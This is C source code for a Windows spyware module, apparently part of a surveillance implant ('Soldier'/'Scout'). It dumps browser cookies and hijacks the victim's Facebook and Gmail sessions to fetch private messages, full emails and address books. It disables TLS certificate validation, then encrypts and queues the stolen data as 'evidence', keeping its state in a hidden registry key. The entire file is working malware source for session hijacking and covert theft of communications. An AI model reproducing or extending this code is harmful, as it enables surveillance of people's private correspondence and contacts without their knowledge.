#include <Windows.h>
#include <winhttp.h>
#include <time.h>

#include "utils.h"
#include "zmem.h"
#include "globals.h"
#include "social.h"

#include "facebook.h"
#include "gmail.h"
#include "cookies.h"
#include "proto.h"
#include "crypt.h"
#include "conf.h"
#include "debug.h"

HINTERNET gHttpSocialSession = NULL;
SOCIAL_ENTRY pSocialEntry[SOCIAL_ENTRY_COUNT];
SOCIAL_LOGS lpSocialLogs[MAX_SOCIAL_QUEUE];
SOCIAL_TIMESTAMPS pSocialTimeStamps[SOCIAL_MAX_ACCOUNTS];


DWORD SocialGetLastTimestamp(__in LPSTR strUser, __out LPDWORD dwHighPart)
{
	if (dwHighPart)
		*dwHighPart = SOCIAL_INVALID_TSTAMP;

	if (!strUser || !strUser[0])
		return SOCIAL_INVALID_TSTAMP;

	for (DWORD i=0; i<SOCIAL_MAX_ACCOUNTS; i++)
	{
		if (!pSocialTimeStamps[i].strUser[0])
		{
			if (dwHighPart)
				*dwHighPart = 0;
			return 0;
		}

		if (!strcmp(strUser, pSocialTimeStamps[i].strUser))
		{
			if (dwHighPart)
				*dwHighPart = pSocialTimeStamps[i].dwTimeHi;
			return pSocialTimeStamps[i].dwTimeLow;
		}
	}

	return SOCIAL_INVALID_TSTAMP;
}

VOID SocialSetLastTimestamp(__in LPSTR strUser, __in DWORD dwLowPart, __in DWORD dwHighPart)
{
	if (!strUser || !strUser[0] || (!dwLowPart & !dwHighPart))
		return;

	DWORD dwTemp;
	if (!pSocialTimeStamps && SocialGetLastTimestamp(strUser, &dwTemp) == SOCIAL_INVALID_TSTAMP && dwTemp == SOCIAL_INVALID_TSTAMP)
		return;

	for (DWORD i=0; i<SOCIAL_MAX_ACCOUNTS; i++)
	{
		if (!pSocialTimeStamps[i].strUser[0])
			break;

		if (!strcmp(strUser, pSocialTimeStamps[i].strUser))
		{
			if (dwHighPart < pSocialTimeStamps[i].dwTimeHi)
				return;
			if (dwHighPart == pSocialTimeStamps[i].dwTimeHi && dwLowPart <= pSocialTimeStamps[i].dwTimeLow)
				return;

			pSocialTimeStamps[i].dwTimeHi = dwHighPart;
			pSocialTimeStamps[i].dwTimeLow = dwLowPart;

			SocialSaveTimeStamps();
			return;
		}
	}

	for (DWORD i=0; i<SOCIAL_MAX_ACCOUNTS; i++)
	{
		if (!pSocialTimeStamps[i].strUser[0])
		{
			_snprintf_s(pSocialTimeStamps[i].strUser, 48, _TRUNCATE, "%s", strUser);
			pSocialTimeStamps[i].dwTimeHi = dwHighPart;
			pSocialTimeStamps[i].dwTimeLow = dwLowPart;

			SocialSaveTimeStamps();
			return;
		}
	}
}

VOID SocialWinHttpClose()
{
	WinHttpCloseHandle(gHttpSocialSession);
}

VOID SocialWinHttpSetup(__in LPWSTR strDestUrl)
{
	WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig;
	WINHTTP_PROXY_INFO ProxyInfoTemp, ProxyInfo;
	WINHTTP_AUTOPROXY_OPTIONS OptPAC;
	DWORD dwOptions = SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

	ZeroMemory(&ProxyInfo, sizeof(ProxyInfo));
	ZeroMemory(&ProxyConfig, sizeof(ProxyConfig));

	// Crea una sessione per winhttp.
	gHttpSocialSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0); // FIXME cambia user-agent

	// Cerca nel registry le configurazioni del proxy
	if (gHttpSocialSession && WinHttpGetIEProxyConfigForCurrentUser(&ProxyConfig)) 
	{
		if (ProxyConfig.lpszProxy) 
		{
			// Proxy specificato
			ProxyInfo.lpszProxy = ProxyConfig.lpszProxy;
			ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
			ProxyInfo.lpszProxyBypass = NULL;
		}

		if (ProxyConfig.lpszAutoConfigUrl) 
		{
			// Script proxy pac
			OptPAC.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
			OptPAC.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
			OptPAC.dwAutoDetectFlags = 0;
			OptPAC.fAutoLogonIfChallenged = TRUE;
			OptPAC.lpvReserved = 0;
			OptPAC.dwReserved = 0;

			if (WinHttpGetProxyForUrl(gHttpSocialSession, strDestUrl, &OptPAC, &ProxyInfoTemp))
				memcpy(&ProxyInfo, &ProxyInfoTemp, sizeof(ProxyInfo));
		}

		if (ProxyConfig.fAutoDetect) 
		{
			// Autodetect proxy
			OptPAC.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
			OptPAC.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
			OptPAC.fAutoLogonIfChallenged = TRUE;
			OptPAC.lpszAutoConfigUrl = NULL;
			OptPAC.lpvReserved = 0;
			OptPAC.dwReserved = 0;

			if (WinHttpGetProxyForUrl(gHttpSocialSession, strDestUrl, &OptPAC, &ProxyInfoTemp))
				memcpy(&ProxyInfo, &ProxyInfoTemp, sizeof(ProxyInfo));
		}

		if (ProxyInfo.lpszProxy) 		
			WinHttpSetOption(gHttpSocialSession, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof(ProxyInfo));
	}

	WinHttpSetOption(gHttpSocialSession, WINHTTP_OPTION_SECURITY_FLAGS, &dwOptions, sizeof (DWORD) );
}

// Invia una richiesta HTTP e legge la risposta
// Alloca il buffer con la risposta (che va poi liberato dal chiamante)
DWORD HttpSocialRequest(
	__in LPWSTR strHostName, 
	__in LPWSTR strHttpVerb, 
	__in LPWSTR strHttpRsrc, 
	__in DWORD dwPort, 
	__in LPBYTE *lpSendBuff, 
	__in DWORD dwSendBuffSize, 
	__out LPBYTE *lpRecvBuff, 
	__out DWORD *dwRespSize, 
	__in LPSTR strCookies)
{
	WCHAR *cookies_w;
	DWORD cookies_len;
	DWORD dwStatusCode = 0;
	DWORD dwTemp = sizeof(dwStatusCode);
	DWORD n_read;
	char *types[] = { "*\x0/\x0*\x0",0 };
	HINTERNET hConnect, hRequest;
	BYTE *ptr;
	DWORD flags = 0;
	BYTE temp_buffer[8*1024];

	// Manda la richiesta
	cookies_len = strlen(strCookies);
	if (cookies_len == 0)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	cookies_len++;
	cookies_w = (WCHAR *)zalloc(cookies_len * sizeof(WCHAR));
	if (!cookies_w)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	_snwprintf_s(cookies_w, cookies_len, _TRUNCATE, L"%S", strCookies);		
	if (dwPort == 443)
		flags = WINHTTP_FLAG_SECURE;

	if (!(hConnect = WinHttpConnect(gHttpSocialSession, (LPCWSTR) strHostName, (INTERNET_PORT)dwPort, 0))) 
	{
		zfree(cookies_w);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	if ( !(hRequest = WinHttpOpenRequest(hConnect, strHttpVerb, strHttpRsrc, NULL, WINHTTP_NO_REFERER, (LPCWSTR *) types, flags)) ) 
	{
		zfree(cookies_w);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	if (!WinHttpAddRequestHeaders(hRequest, L"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) // FIXME array-izza la stringa
	{
		zfree(cookies_w);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	if (!WinHttpAddRequestHeaders(hRequest, cookies_w, -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) 
	{
		zfree(cookies_w);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, lpSendBuff, dwSendBuffSize, dwSendBuffSize, NULL))
	{
		zfree(cookies_w);
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}
	zfree(cookies_w);

	// Legge la risposta
	if(!WinHttpReceiveResponse(hRequest, 0)) 
	{
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE| WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwTemp, NULL ))  
	{
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}
	
	if (dwStatusCode != HTTP_STATUS_OK) 
	{
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	*dwRespSize = 0;
	*lpRecvBuff = NULL;
	for(;;) 
	{
		if (!WinHttpReadData(hRequest, temp_buffer, sizeof(temp_buffer), &n_read) || n_read==0 || n_read>sizeof(temp_buffer))
			break;
		if (!(ptr = (BYTE *)realloc((*lpRecvBuff), (*dwRespSize) + n_read + sizeof(WCHAR))))
			break;
		*lpRecvBuff = ptr;
		memcpy(((*lpRecvBuff) + (*dwRespSize)), temp_buffer, n_read);
		*dwRespSize = (*dwRespSize) + n_read;
		// Null-termina sempre il buffer
		memset(((*lpRecvBuff) + (*dwRespSize)), 0, sizeof(WCHAR));
	} 

	if (!(*lpRecvBuff)) 
	{
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	return SOCIAL_REQUEST_SUCCESS;
}


VOID InitSocialEntries()
{
	ULONG n = 0;
	SecureZeroMemory(pSocialEntry, sizeof(SOCIAL_ENTRY)*SOCIAL_ENTRY_COUNT-1);

	for (DWORD i=0; i<SOCIAL_ENTRY_COUNT; i++)
		pSocialEntry[i].bWaitCookie = TRUE;

	if (ConfIsModuleEnabled(L"messages"))
	{
#ifdef _DEBUG
		OutputDebug(L"[*] Social: inizializing messages\n");
#endif
		wcscpy_s(pSocialEntry[n].strDomain, FACEBOOK_DOMAIN);
		pSocialEntry[n].fpRequestHandler = FacebookMessageHandler;
		n++;

		wcscpy_s(pSocialEntry[n].strDomain, GMAIL_DOMAIN);
		pSocialEntry[n].fpRequestHandler = GMailMessageHandler;
		n++;
	}

	if (ConfIsModuleEnabled(L"addressbook"))
	{
#ifdef _DEBUG
		OutputDebug(L"[*] Social: inizializing adressbook\n");
#endif
		wcscpy_s(pSocialEntry[n].strDomain, FACEBOOK_DOMAIN);
		pSocialEntry[n].fpRequestHandler = FacebookContactHandler;
		n++;

		wcscpy_s(pSocialEntry[n].strDomain, GMAIL_DOMAIN);
		pSocialEntry[n].fpRequestHandler = GMailContactHandler;
		n++;
	}

	// load timestamps
	SocialLoadTimeStamps();
	/*
	wcscpy_s(pSocialEntry[2].strDomain, GMAIL_DOMAIN);
	pSocialEntry[2].fpRequestHandler = GMailHandler;


	wcscpy_s(pSocialEntry[3].strDomain, TWITTER_DOMAIN);
	pSocialEntry[3].fpRequestHandler = TwitterContactsHandler;

	wcscpy_s(pSocialEntry[4].strDomain, TWITTER_DOMAIN);
	pSocialEntry[4].fpRequestHandler = TwitterTweetsHandler;

	wcscpy_s(pSocialEntry[4].strDomain, OUTLOOK_DOMAIN);
	pSocialEntry[4].fpRequestHandler = OutlookMailHandler;
	*/

	SecureZeroMemory(lpSocialLogs, sizeof(lpSocialLogs));
}


VOID SocialMain()
{
	InitSocialEntries();
	SocialWinHttpSetup(L"http://www.facebook.com");

	for (;;)
	{
		if (bSocialThread == FALSE)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] SocialMain exiting\n");
#endif
			//SocialWinHttpClose();
			hSocialThread = NULL;
			return;
		}

		for (int j=0; j<SLEEP_COOKIE; j++) 
			MySleep(1);

		if (bCollectEvidences)
		{
			// c'e' qualcuno in attesa di cookie nuovi ?
			for (DWORD i=0; i<SOCIAL_ENTRY_COUNT; i++)
			{
				if (pSocialEntry[i].bWaitCookie || pSocialEntry[i].dwIdle == 0)
				{
					DumpCookies();
					break;
				}
			}

			for (DWORD i=0; i<SOCIAL_ENTRY_COUNT; i++)
			{
				if (pSocialEntry[i].bWaitCookie && pSocialEntry[i].bNewCookie)
				{
					pSocialEntry[i].dwIdle = 0;
					pSocialEntry[i].bWaitCookie = FALSE;
				}
			}

			for (DWORD i=0; i<SOCIAL_ENTRY_COUNT; i++)
			{
				if (pSocialEntry[i].dwIdle == 0)
				{
					LPSTR strCookie = GetCookieString(pSocialEntry[i].strDomain);
					if (strCookie)
					{
						DWORD dwRet = pSocialEntry[i].fpRequestHandler(strCookie);
						zfree(strCookie);

						if (dwRet == SOCIAL_REQUEST_SUCCESS)
						{
							pSocialEntry[i].dwIdle = SOCIAL_LONG_IDLE;
							pSocialEntry[i].bWaitCookie = FALSE;						
						}
						else if (dwRet == SOCIAL_REQUEST_BAD_COOKIE)
						{
							pSocialEntry[i].dwIdle = SOCIAL_LONG_IDLE;
							pSocialEntry[i].bWaitCookie = TRUE;	
						}
						else
						{
							pSocialEntry[i].dwIdle = SOCIAL_SHORT_IDLE;
							pSocialEntry[i].bWaitCookie = TRUE;	
						}
					}
					else
					{ // no cookie string
						pSocialEntry[i].dwIdle = SOCIAL_LONG_IDLE;
						pSocialEntry[i].bWaitCookie = TRUE;

					}
				}
				else
					pSocialEntry[i].dwIdle--;
			}
		}
	}

}

BOOL IsInterestingDomainW(LPWSTR strDomain)
{
	for (DWORD i=0; i<SOCIAL_ENTRY_COUNT; i++)
		if(!wcscmp(strDomain, pSocialEntry[i].strDomain))
			return TRUE;

	// Caso particolare per cookie di mail.google.com messi sul dominio principale
	if (!wcscmp(strDomain, L"google.com"))
		 return TRUE;

	return FALSE;
}

BOOL IsInterestingDomainA(LPSTR strDomain)
{
	WCHAR strDomainW[1024];
	_snwprintf_s(strDomainW, sizeof(strDomainW)/sizeof(WCHAR), _TRUNCATE, L"%S", strDomain);
	return IsInterestingDomainW(strDomainW);

}


BOOL QueueSociallog(LPBYTE lpEvBuff, DWORD dwEvSize)
{
	for (DWORD i=0; i<MAX_SOCIAL_QUEUE; i++)
	{
		if (lpSocialLogs[i].dwSize == 0 || lpSocialLogs[i].lpBuffer == NULL)
		{
			lpSocialLogs[i].dwSize = dwEvSize;
			lpSocialLogs[i].lpBuffer = lpEvBuff;

			return TRUE;
		}
	}

	return FALSE;
}

LPBYTE SocialContactAddToLog(LPBYTE lpBuffer, LPWSTR lpData, DWORD dwType)
{
	if (dwType && lpData && wcslen(lpData))
	{
		DWORD dwLen = (wcslen(lpData)*sizeof(WCHAR)) | (dwType<<24);

		*(LPDWORD)lpBuffer = dwLen;
		lpBuffer += sizeof(DWORD);
		memcpy(lpBuffer, lpData, wcslen(lpData)*sizeof(WCHAR));
		lpBuffer += wcslen(lpData)*sizeof(WCHAR);
	}

	return lpBuffer;
}

VOID SocialLogContactW(
	__in DWORD dwProgram,
	__in LPWSTR strUserName,
	__in LPWSTR strEmail,
	__in LPWSTR strCompany,
	__in LPWSTR strHomeAddr,
	__in LPWSTR strOfficeAddr,
	__in LPWSTR strOfficePhone,
	__in LPWSTR strMobilePhone,
	__in LPWSTR strHomePhone,
	__in LPWSTR strScreenName, 
	__in LPWSTR strFacebookProfile,
	__in DWORD dwFlags)
{
	SOCIAL_CONTACT_HEADER pContactHeader;

	pContactHeader.dwVersion = 0x01000001;
	pContactHeader.lOid = 0;
	pContactHeader.dwProgram = dwProgram;
	pContactHeader.dwFlags = dwFlags;

	pContactHeader.dwSize = sizeof(SOCIAL_CONTACT_HEADER);
	if (strUserName && wcslen(strUserName))
		pContactHeader.dwSize += (wcslen(strUserName)*sizeof(WCHAR)) + sizeof(DWORD);
	if (strEmail && wcslen(strEmail))
		pContactHeader.dwSize += (wcslen(strEmail)*sizeof(WCHAR)) + sizeof(DWORD);
	if (strCompany && wcslen(strCompany))
		pContactHeader.dwSize += (wcslen(strCompany)*sizeof(WCHAR)) + sizeof(DWORD);
	if (strHomeAddr && wcslen(strHomeAddr))
		pContactHeader.dwSize += (wcslen(strHomeAddr)*sizeof(WCHAR)) + sizeof(DWORD);
	if (strOfficeAddr && wcslen(strOfficeAddr))
		pContactHeader.dwSize += (wcslen(strOfficeAddr)*sizeof(WCHAR)) + sizeof(DWORD);
	if (strOfficePhone && wcslen(strOfficePhone))
		pContactHeader.dwSize += (wcslen(strOfficePhone)*sizeof(WCHAR)) + sizeof(DWORD);
	if (strMobilePhone && wcslen(strMobilePhone))
		pContactHeader.dwSize += (wcslen(strMobilePhone)*sizeof(WCHAR)) + sizeof(DWORD);
	if (strHomePhone && wcslen(strHomePhone))
		pContactHeader.dwSize += (wcslen(strHomePhone)*sizeof(WCHAR)) + sizeof(DWORD);
	if (strScreenName && wcslen(strScreenName))
		pContactHeader.dwSize += (wcslen(strScreenName)*sizeof(WCHAR)) + sizeof(DWORD);
	if (strFacebookProfile && wcslen(strFacebookProfile))
		pContactHeader.dwSize += (wcslen(strFacebookProfile)*sizeof(WCHAR)) + sizeof(DWORD);

	LPBYTE lpBuffer = (LPBYTE) zalloc(pContactHeader.dwSize);
	LPBYTE lpTmp = lpBuffer;
	memcpy(lpTmp, &pContactHeader, sizeof(SOCIAL_CONTACT_HEADER));
	lpTmp += sizeof(SOCIAL_CONTACT_HEADER);

	lpTmp = SocialContactAddToLog(lpTmp, strUserName, 0x1);
	lpTmp = SocialContactAddToLog(lpTmp, strEmail, 0x6);
	lpTmp = SocialContactAddToLog(lpTmp, strCompany, 0x3);
	lpTmp = SocialContactAddToLog(lpTmp, strHomeAddr, 0x21);
	lpTmp = SocialContactAddToLog(lpTmp, strOfficeAddr, 0x2a);
	lpTmp = SocialContactAddToLog(lpTmp, strOfficePhone, 0xa);
	lpTmp = SocialContactAddToLog(lpTmp, strMobilePhone, 0x7);
	lpTmp = SocialContactAddToLog(lpTmp, strHomePhone, 0xc);
	lpTmp = SocialContactAddToLog(lpTmp, strScreenName, 0x40);
	lpTmp = SocialContactAddToLog(lpTmp, strFacebookProfile, 0x38);

	DWORD dwEvSize;
	LPBYTE lpEvBuffer = PackEncryptEvidence(pContactHeader.dwSize, lpBuffer, PM_CONTACTSAGENT, NULL, 0, &dwEvSize);
	zfree(lpBuffer);

	if (!QueueSociallog(lpEvBuffer, dwEvSize))
		zfree(lpEvBuffer);
}



VOID SocialLogIMMessageW(
	__in DWORD dwProgram, 
	__in LPWSTR strPeers, 
	__in LPWSTR strPeersId, 
	__in LPWSTR strAuthor, 
	__in LPWSTR strAuthorId, 
	__in LPWSTR strBody,
	__in struct tm *tStamp, 
	__in BOOL bIncoming)
{
	DWORD dwDelimiter = ELEM_DELIMITER;
	DWORD dwFlags = bIncoming ? 0x01 : 0x0;

	if (!dwProgram || !strPeers || !strPeersId || !strAuthor || !strAuthorId || !strBody)
		return;

	DWORD dwTotalSize = 
		sizeof(struct tm) + 
		sizeof(DWORD) + sizeof(DWORD) + 
		(wcslen(strPeers)+1)*sizeof(WCHAR) +
		(wcslen(strPeersId)+1)*sizeof(WCHAR) +
		(wcslen(strAuthor)+1)*sizeof(WCHAR) +
		(wcslen(strAuthorId)+1)*sizeof(WCHAR) +
		(wcslen(strBody)+1)*sizeof(WCHAR) +
		sizeof(DWORD);

	LPBYTE lpBuffer = (LPBYTE) zalloc(dwTotalSize);
	LPBYTE lpTmpBuff  = lpBuffer;

	memcpy(lpTmpBuff, tStamp, sizeof(struct tm));
	lpTmpBuff += sizeof(struct tm);

	memcpy(lpTmpBuff, &dwProgram, sizeof(DWORD));
	lpTmpBuff += sizeof(DWORD);

	memcpy(lpTmpBuff, &dwFlags, sizeof(DWORD));
	lpTmpBuff += sizeof(DWORD);

	memcpy(lpTmpBuff, strAuthorId, (wcslen(strAuthorId)+1)*sizeof(WCHAR));
	lpTmpBuff += (wcslen(strAuthorId)+1)*sizeof(WCHAR);

	memcpy(lpTmpBuff, strAuthor, (wcslen(strAuthor)+1)*sizeof(WCHAR));
	lpTmpBuff += (wcslen(strAuthor)+1)*sizeof(WCHAR);

	memcpy(lpTmpBuff, strPeersId, (wcslen(strPeersId)+1)*sizeof(WCHAR));
	lpTmpBuff += (wcslen(strPeersId)+1)*sizeof(WCHAR);

	memcpy(lpTmpBuff, strPeers, (wcslen(strPeers)+1)*sizeof(WCHAR));
	lpTmpBuff += (wcslen(strPeers)+1)*sizeof(WCHAR);

	memcpy(lpTmpBuff, strBody, (wcslen(strBody)+1)*sizeof(WCHAR));
	lpTmpBuff += (wcslen(strBody)+1)*sizeof(WCHAR);

	memcpy(lpTmpBuff, &dwDelimiter, sizeof(DWORD));

	DWORD dwEvSize;
	LPBYTE lpEvBuffer = PackEncryptEvidence(dwTotalSize, lpBuffer, PM_IMAGENT_SOCIAL, NULL, 0, &dwEvSize);
	zfree(lpBuffer);

	if (!QueueSociallog(lpEvBuffer, dwEvSize))
		zfree(lpEvBuffer);
}

VOID SocialLogIMMessageA(
	__in DWORD dwProgram, 
	__in LPSTR strPeers, 
	__in LPSTR strPeersId, 
	__in LPSTR strAuthor, 
	__in LPSTR strAuthorId, 
	__in LPSTR strBody,
	__in struct tm *tStamp, 
	__in BOOL bIncoming)
{
	LPWSTR strPeersW = UTF8_2_UTF16(strPeers);
	LPWSTR strPeersIdW = UTF8_2_UTF16(strPeersId);
	LPWSTR strAuthorW = UTF8_2_UTF16(strAuthor);
	LPWSTR strAuthorIdW = UTF8_2_UTF16(strAuthorId);
	LPWSTR strBodyW = UTF8_2_UTF16(strBody);

	SocialLogIMMessageW(dwProgram, strPeersW, strPeersIdW, strAuthorW, strAuthorIdW, strBodyW, tStamp, bIncoming);

	zfree(strPeersW);
	zfree(strPeersIdW);
	zfree(strAuthorW);
	zfree(strAuthorIdW);
	zfree(strBodyW);
}

VOID SocialLogMailFull(
	__in DWORD dwProgram,
	__in LPSTR lpBuffer,
	__in DWORD dwBufferSize,
	__in BOOL bIncoming,
	__in BOOL bDraft)
{
	SOCIAL_MAIL_MESSSAGE_HEADER pMailHeader;
	SecureZeroMemory(&pMailHeader, sizeof(SOCIAL_MAIL_MESSSAGE_HEADER));

	pMailHeader.dwSize = dwBufferSize;
	pMailHeader.dwFlags = MAIL_FULL_BODY;
	if (bIncoming)
		pMailHeader.dwFlags |= MAIL_INCOMING;
	else
		pMailHeader.dwFlags |= MAIL_OUTGOING;

	if (bDraft)
		pMailHeader.dwFlags |= MAIL_DRAFT;

	pMailHeader.dwProgram = dwProgram;
	pMailHeader.dwVersionFlags = MAPI_V3_0_PROTO;

	DWORD dwEvSize;
	LPBYTE lpEvBuffer = PackEncryptEvidence(dwBufferSize, (LPBYTE)lpBuffer, PM_MAILAGENT, (LPBYTE)&pMailHeader, sizeof(SOCIAL_MAIL_MESSSAGE_HEADER), &dwEvSize);
	//zfree(lpBuffer);

	if (!QueueSociallog(lpEvBuffer, dwEvSize))
		zfree(lpEvBuffer);
}

BOOL SocialSaveTimeStamps()
{
	HKEY hKey;
	WCHAR strBase[] = SOLDIER_REGISTRY_KEY;
	WCHAR strTimeStamps[] = SOLDIER_REGISTRY_TSTAMPS;

	LPWSTR strUnique = GetScoutSharedMemoryName();
	LPWSTR strSubKey = (LPWSTR) zalloc(1024*sizeof(WCHAR));
	_snwprintf_s(strSubKey, 1024, _TRUNCATE, L"%s\\%s", strBase, strUnique);	
	if (!CreateRegistryKey(HKEY_CURRENT_USER, strSubKey, REG_OPTION_NON_VOLATILE, KEY_READ|KEY_WRITE, &hKey))
	{
		zfree(strUnique);
		zfree(strSubKey);
		return FALSE;
	}

	DWORD dwOut = sizeof(pSocialTimeStamps);
	DWORD dwRet = RegSetValueEx(hKey, strTimeStamps, 0, REG_BINARY, (LPBYTE)pSocialTimeStamps, sizeof(pSocialTimeStamps));

	RegCloseKey(hKey);
	return TRUE;
}

BOOL SocialLoadTimeStamps()
{
	HKEY hKey;
	WCHAR strBase[] = SOLDIER_REGISTRY_KEY;
	WCHAR strTimeStamps[] = SOLDIER_REGISTRY_TSTAMPS;

	SecureZeroMemory(pSocialTimeStamps, sizeof(pSocialTimeStamps));
	
	LPWSTR strUnique = GetScoutSharedMemoryName();
	LPWSTR strSubKey = (LPWSTR) zalloc(1024*sizeof(WCHAR));
	_snwprintf_s(strSubKey, 1024, _TRUNCATE, L"%s\\%s", strBase, strUnique);	
	if (!CreateRegistryKey(HKEY_CURRENT_USER, strSubKey, REG_OPTION_NON_VOLATILE, KEY_READ|KEY_WRITE, &hKey))
	{
		zfree(strUnique);
		zfree(strSubKey);
		return FALSE;
	}

	DWORD dwOut = sizeof(pSocialTimeStamps);
	DWORD dwRet = RegQueryValueEx(hKey, strTimeStamps, NULL, NULL, (LPBYTE)pSocialTimeStamps, &dwOut);
	
	RegCloseKey(hKey);
	zfree(strUnique);
	zfree(strSubKey);
	return FALSE;
}

VOID SocialDeleteTimeStamps()
{
	WCHAR strBase[] = SOLDIER_REGISTRY_KEY;
	WCHAR strTimeStamps[] = SOLDIER_REGISTRY_TSTAMPS;
	LPWSTR strUnique = GetScoutSharedMemoryName();
	LPWSTR strSubKey = (LPWSTR) zalloc(1024*sizeof(WCHAR));

	_snwprintf_s(strSubKey, 1024, _TRUNCATE, L"%s\\%s", strBase, strUnique);	
	SHDeleteKey(HKEY_CURRENT_USER, strSubKey);

	zfree(strUnique);
	zfree(strSubKey);
}